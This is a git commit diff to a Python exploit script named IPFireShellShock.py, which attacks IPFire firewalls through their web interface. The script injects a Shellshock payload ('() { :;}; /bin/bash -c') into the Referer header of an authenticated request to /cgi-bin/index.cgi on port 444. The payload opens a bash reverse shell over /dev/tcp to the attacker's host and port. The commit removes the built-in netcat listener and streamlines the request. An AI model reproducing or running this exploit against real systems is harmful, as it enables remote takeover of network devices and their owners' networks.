b180cfc2db243c99523a3865bfc26364c2894807
m4udSec <felipepratesdl@gmail.com>
2021-05-13 23:52:40 -0300

    t commit

--- IPFireShellShock.py
+++ IPFireShellShock.py
@@ -3,8 +3,7 @@ import base64
 import sys
 from urllib3.exceptions import InsecureRequestWarning
 from optparse import OptionParser
-from multiprocessing.dummy import Pool
-import subprocess
+
 
 class burn(): 
   def __init__(self, options): 
@@ -15,37 +14,22 @@ class burn():
     self.lport = options.lport  
 
     print("\r\n[+] (m4ud) ShellShock IPFire to Shell! [+]\r\n")
-    shell = "sleep 3;bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
+    shell = "sleep 2;bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
     auth = self.user + ":" + self.pwd
 
     auth = base64.b64encode(bytes(auth, encoding='utf-8')).decode('utf-8')
     auth = "Basic " + auth
 
     ShellShock = "() { :;}; /bin/bash -c " + '"' + shell + '"'
-    global headers
     headers = { "Authorization": auth, "Referer": ShellShock }
 
-    global url
     url = "https://" + self.target + ":444/cgi-bin/index.cgi"
     requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
     print("[+] Throwing a water bucket in IPFire!  [+]")
     print("[*] Get Shell, check your netcat listener! [*]")
-#    r = requests.get(url, headers=headers, verify=False)
-    pool = Pool(2)   
-    for i in range(1):
-      pool.apply_async(pool.apply_async(self.req()))
+    r = requests.get(url, headers=headers, verify=False, timeout=(1, 0.0000000001))
 
-      pool.apply_async(pool.apply_async(self.getshell()))
-  def req(self):
-      try:
-          r = requests.get(url, headers=headers, verify=False, timeout=1.0)
-      except requests.exceptions.ReadTimeout:
-          pass
-  def getshell(self):
-    print("[*] Ooh boy, here it comes the Shell! [*]\r\n")
-    nc = subprocess.run('nc -nlvp ' + str(self.lport), shell=True)
 def main():
-#  exploit = burn()
   parser = OptionParser()  
     
   parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")  
